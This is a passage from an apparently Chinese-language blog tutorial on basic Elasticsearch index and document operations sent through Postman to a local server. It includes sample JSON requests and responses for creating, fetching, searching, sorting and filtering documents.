、yellow(单点正常&#x2F;集群不完整)、red(单点不正常)</td></tr><tr><td>status</td><td>索引打开、关闭状态</td></tr><tr><td>index</td><td>索引名</td></tr><tr><td>uuid</td><td>索引统一编号</td></tr><tr><td>pri</td><td>主分片数量</td></tr><tr><td>rep</td><td>副本数量</td></tr><tr><td>docs.count</td><td>可用文档数量</td></tr><tr><td>docs.deleted</td><td>文档删除状态（逻辑删除）</td></tr><tr><td>store.size</td><td>主分片和副分片整体占空间大小</td></tr><tr><td>pri.store.size</td><td>主分片占空间大小</td></tr></tbody></table><hr><h2 id="查看单个索引"><a href="#查看单个索引" class="headerlink" title="查看单个索引"></a>查看单个索引</h2><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping">http://127.0.0.1:9200/shopping</a></p><p>查看索引向 ES 服务器发送的请求路径和创建索引是一致的。但是 HTTP 方法不一致。这里可以体会一下 RESTful 的意义，请求后，服务器响应结果如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211103235617.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;shopping&quot;</span><span class="string">【索引名】:</span> &#123;</span><br><span class="line">        <span class="string">&quot;aliases&quot;</span><span class="string">【别名】:</span> &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;mappings&quot;</span><span class="string">【映射】:</span> &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;settings&quot;</span><span class="string">【设置】:</span> &#123;</span><br><span class="line">            <span class="string">&quot;index&quot;</span><span class="string">&quot;【设置 - 索引】: &#123;</span></span><br><span class="line"><span class="string">                &quot;</span><span class="string">routing&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;allocation&quot;:</span> &#123;</span><br><span class="line">                        <span class="attr">&quot;include&quot;:</span> &#123;</span><br><span class="line">                            <span class="attr">&quot;_tier_preference&quot;:</span> <span class="string">&quot;data_content&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;number_of_shards&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">主分片数量】:</span> <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;provided_name&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">名称】:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">                <span class="string">&quot;creation_date&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">创建时间】:</span> <span class="string">&quot;1635953868328&quot;</span>,</span><br><span class="line">                <span class="string">&quot;number_of_replicas&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">副分片数量】:</span> <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uuid&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">唯一标识】:</span> <span class="string">&quot;bEIGo07lTDu5Xo0tQmcwNw&quot;</span>,</span><br><span class="line">                <span class="string">&quot;version&quot;</span><span class="string">【设置</span> <span class="bullet">-</span> <span class="string">索引</span> <span class="bullet">-</span> <span class="string">版本】:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;created&quot;:</span> <span class="string">&quot;7150199&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><p>在 Postman 中，向 ES 服务器发 <strong>DELETE</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping">http://127.0.0.1:9200/shopping</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104000508.png"></p><p>重新访问索引时，服务器返回响应：<strong>索引不存在</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104000537.png"></p><hr><h1 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h1><h2 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h2><p>索引已经创建好了，接下来我们来创建文档，并添加数据。这里的文档可以类比为关系型数据库中的表数据，添加的数据格式为 JSON 格式。</p><p>在 Postman 中，向 ES 服务器发 <strong>POST</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_doc">http://127.0.0.1:9200/shopping**/_doc</a>**</p><p>请求体内容为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;title&quot;</span><span class="string">:&quot;华为mate40</span> <span class="string">Pro&quot;</span>,</span><br><span class="line"> <span class="string">&quot;category&quot;</span><span class="string">:&quot;华为&quot;</span>,</span><br><span class="line"> <span class="string">&quot;images&quot;</span><span class="string">:&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line"> <span class="string">&quot;price&quot;</span><span class="string">:6999.00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104001143.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;_index&quot;</span><span class="string">【索引】:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_type&quot;</span><span class="string">【类型-文档】:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_id&quot;</span><span class="string">【唯一标识】:</span> <span class="string">&quot;aFmU5nwBKn8hkLcxQ-bn&quot;</span>, <span class="comment">#可以类比为 MySQL 中的主键，随机生成</span></span><br><span class="line">    <span class="string">&quot;_version&quot;</span><span class="string">【版本】:</span> <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;result&quot;</span><span class="string">【结果】:</span> <span class="string">&quot;created&quot;</span>, <span class="comment">#这里的 create 表示创建成功</span></span><br><span class="line">    <span class="string">&quot;_shards&quot;</span><span class="string">【分片】:</span> &#123;</span><br><span class="line">        <span class="string">&quot;total&quot;</span><span class="string">【分片</span> <span class="bullet">-</span> <span class="string">总数】:</span> <span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;successful&quot;</span><span class="string">【分片</span> <span class="bullet">-</span> <span class="string">成功】:</span> <span class="number">1</span>,</span><br><span class="line">        <span class="string">&quot;failed&quot;</span><span class="string">【分片</span> <span class="bullet">-</span> <span class="string">失败】:</span> <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;_seq_no&quot;:</span> <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;_primary_term&quot;:</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的数据创建后，由于没有指定数据唯一性标识（ID），默认情况下，ES 服务器会随机生成一个。</p><p>此处发送请求的方式必须为 <strong>POST</strong>，不能是 <strong>PUT</strong>，否则会发生错误：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104001226.png"></p><p>如果想要自定义唯一性标识，需要在创建时指定：<a href="http://127.0.0.1:9200/shopping/_doc/**1">http://127.0.0.1:9200/shopping/_doc/**1</a>**</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104001652.png"></p><p>此处需要<strong>注意</strong>：如果增加数据时明确数据主键，那么请求方式也可以为 PUT</p><hr><h2 id="根据ID查看文档"><a href="#根据ID查看文档" class="headerlink" title="根据ID查看文档"></a>根据ID查看文档</h2><p>查看文档时，需要指明文档的唯一性标识，类似于 MySQL 中数据的主键查询</p><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_doc/1">http://127.0.0.1:9200/shopping**/_doc/1</a>**</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104001942.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;_index&quot;</span><span class="string">【索引】:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_type&quot;</span><span class="string">【文档类型】:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_id&quot;:</span> <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_version&quot;:</span> <span class="number">1</span>,</span><br><span class="line">    <span class="attr">&quot;_seq_no&quot;:</span> <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;_primary_term&quot;:</span> <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;found&quot;</span><span class="string">【查询结果】:</span> <span class="literal">true</span>, <span class="comment"># true 表示查找到，false 表示未查找到</span></span><br><span class="line">    <span class="string">&quot;_source&quot;</span><span class="string">【文档源信息】:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;title&quot;:</span> <span class="string">&quot;华为mate40 Pro&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;category&quot;:</span> <span class="string">&quot;华为&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;images&quot;:</span> <span class="string">&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;price&quot;:</span> <span class="number">6999.00</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="查看所有文档"><a href="#查看所有文档" class="headerlink" title="查看所有文档"></a>查看所有文档</h2><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping**/_search">http://127.0.0.1:9200/shopping**/_search</a>**</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211104234015.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;took&quot;:</span> <span class="number">13</span>,</span><br><span class="line">    <span class="attr">&quot;timed_out&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;_shards&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;total&quot;:</span> <span class="number">1</span>,</span><br><span class="line">        <span class="attr">&quot;successful&quot;:</span> <span class="number">1</span>,</span><br><span class="line">        <span class="attr">&quot;skipped&quot;:</span> <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;failed&quot;:</span> <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;hits&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;total&quot;:</span> &#123;</span><br><span class="line">            <span class="attr">&quot;value&quot;:</span> <span class="number">3</span>,</span><br><span class="line">            <span class="attr">&quot;relation&quot;:</span> <span class="string">&quot;eq&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;max_score&quot;:</span> <span class="number">1.0</span>,</span><br><span class="line">        <span class="attr">&quot;hits&quot;:</span> [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_index&quot;:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_type&quot;:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_id&quot;:</span> <span class="string">&quot;Z1mQ5nwBKn8hkLcx8OZT&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;:</span> <span class="number">1.0</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;:</span> <span class="string">&quot;华为mate40 Pro&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;category&quot;:</span> <span class="string">&quot;华为&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;images&quot;:</span> <span class="string">&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;price&quot;:</span> <span class="number">6999.00</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_index&quot;:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_type&quot;:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_id&quot;:</span> <span class="string">&quot;aFmU5nwBKn8hkLcxQ-bn&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;:</span> <span class="number">1.0</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;:</span> <span class="string">&quot;华为mate40 Pro&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;category&quot;:</span> <span class="string">&quot;华为&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;images&quot;:</span> <span class="string">&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;price&quot;:</span> <span class="number">6999.00</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;_index&quot;:</span> <span class="string">&quot;shopping&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_type&quot;:</span> <span class="string">&quot;_doc&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_id&quot;:</span> <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;_score&quot;:</span> <span class="number">1.0</span>,</span><br><span class="line">                <span class="attr">&quot;_source&quot;:</span> &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;:</span> <span class="string">&quot;华为P50&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;category&quot;:</span> <span class="string">&quot;华为&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;images&quot;:</span> <span class="string">&quot;https://www-file.huawei.com/-/media/corporate/images/home/logo/huawei_logo.png&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;price&quot;:</span> <span class="number">5999.00</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="高级查询文档"><a href="#高级查询文档" class="headerlink" title="高级查询文档"></a>高级查询文档</h2><h3 id="匹配查询"><a href="#匹配查询" class="headerlink" title="匹配查询"></a>匹配查询</h3><p>方式一（url参数）：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105232008.png"></p><p>方式二（请求体）：</p><p>match 匹配类型查询，会把查询条件进行分词，然后进行查询，多个词条之间是 or 的关系</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105232356.png"></p><hr><h3 id="字段匹配查询"><a href="#字段匹配查询" class="headerlink" title="字段匹配查询"></a>字段匹配查询</h3><p>multi_match 与 match 类似，不同的是它可以在多个字段中查询。</p><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/shopping/_search">http://127.0.0.1:9200/shopping/_search</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107165731.png"></p><hr><h3 id="关键字精确查询"><a href="#关键字精确查询" class="headerlink" title="关键字精确查询"></a>关键字精确查询</h3><p>term 查询，精确的关键词匹配查询，不对查询条件进行分词。</p><p>定义数据 :</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST /student/_doc/1001</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span><span class="string">:&quot;zhangsan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span><span class="string">:&quot;zhangsan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span><span class="string">:&quot;男&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span><span class="string">:30</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># POST /student/_doc/1002</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span><span class="string">:&quot;lisi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span><span class="string">:&quot;lisi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span><span class="string">:&quot;男&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span><span class="string">:20</span> </span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment"># POST /student/_doc/1003</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span><span class="string">:&quot;wangwu&quot;</span>,</span><br><span class="line">     <span class="string">&quot;nickname&quot;</span><span class="string">:&quot;wangwu&quot;</span>,</span><br><span class="line">     <span class="string">&quot;sex&quot;</span><span class="string">:&quot;女&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span><span class="string">:40</span> </span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment"># POST /student/_doc/1004</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span><span class="string">:&quot;zhangsan1&quot;</span>,</span><br><span class="line">     <span class="string">&quot;nickname&quot;</span><span class="string">:&quot;zhangsan1&quot;</span>,</span><br><span class="line">     <span class="string">&quot;sex&quot;</span><span class="string">:&quot;女&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span><span class="string">:50</span> </span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment"># POST /student/_doc/1005</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;name&quot;</span><span class="string">:&quot;zhangsan2&quot;</span>,</span><br><span class="line">     <span class="string">&quot;nickname&quot;</span><span class="string">:&quot;zhangsan2&quot;</span>,</span><br><span class="line">     <span class="string">&quot;sex&quot;</span><span class="string">:&quot;女&quot;</span>,</span><br><span class="line">     <span class="string">&quot;age&quot;</span><span class="string">:30</span> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/shopping/_search">http://127.0.0.1:9200/shopping/_search</a></p><p>term 查询，精确的关键词匹配查询，不对查询条件进行分词。（自己试了下，中文好像只能匹配第一个字符）</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107232317.png"></p><hr><h3 id="多关键字匹配查询"><a href="#多关键字匹配查询" class="headerlink" title="多关键字匹配查询"></a>多关键字匹配查询</h3><p>terms 查询和 term 查询一样，但它允许你指定多值进行匹配。</p><p>如果这个字段包含了指定值中的任何一个值，那么这个文档满足条件，类似于 mysql 的 in</p><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107232756.png"></p><hr><h3 id="全查询"><a href="#全查询" class="headerlink" title="全查询"></a>全查询</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105232726.png"></p><hr><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105234753.png"></p><hr><h3 id="指定字段查询"><a href="#指定字段查询" class="headerlink" title="指定字段查询"></a>指定字段查询</h3><p>默认情况下，Elasticsearch 在搜索的结果中，会把文档中保存在_source 的所有字段都返回。</p><p>如果我们只想获取其中的部分字段，我们可以添加_source 的过滤</p><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/shopping/_search">http://127.0.0.1:9200/shopping/_search</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105235105.png"></p><hr><h3 id="字段排序"><a href="#字段排序" class="headerlink" title="字段排序"></a>字段排序</h3><p>sort 可以让我们按照不同的字段进行排序，并且通过 order 指定排序的方式。desc 降序，asc升序。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211105235447.png"></p><p>多字段排序：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;match_all&quot;</span><span class="string">:</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span><span class="string">:</span>[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;age&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                <span class="string">&quot;order&quot;</span><span class="string">:&quot;desc&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_score&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                <span class="string">&quot;order&quot;</span><span class="string">:&quot;desc&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="过滤字段"><a href="#过滤字段" class="headerlink" title="过滤字段"></a>过滤字段</h3><ul><li><p>includes：来指定想要显示的字段</p></li><li><p>excludes：来指定不想要显示的字段</p></li></ul><p>在 Postman 中，向 ES 服务器发 GET 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107233333.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107233447.png"></p><hr><h3 id="组合查询"><a href="#组合查询" class="headerlink" title="组合查询"></a>组合查询</h3><p><code>bool</code>把各种其它查询通过<code>must</code>（必须 ）、<code>must_not</code>（必须不）、<code>should</code>（应该，可以为）的方式进行组合</p><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/student/_search">http://127.0.0.1:9200/student/_search</a></p><p>请求体：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;query&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">        <span class="string">&quot;bool&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">            <span class="string">&quot;must&quot;</span><span class="string">:</span>[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;match&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                        <span class="string">&quot;name&quot;</span><span class="string">:&quot;zhangsan&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;must_not&quot;</span><span class="string">:</span>[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;match&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                        <span class="string">&quot;age&quot;</span><span class="string">:40</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;should&quot;</span><span class="string">:</span>[</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;match&quot;</span><span class="string">:</span>&#123;</span><br><span class="line">                        <span class="string">&quot;sex&quot;</span><span class="string">:&quot;男&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211107235435.png"></p><hr><h3 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h3><p>range 查询找出哪些落在指定区间内的数字或者时间。range 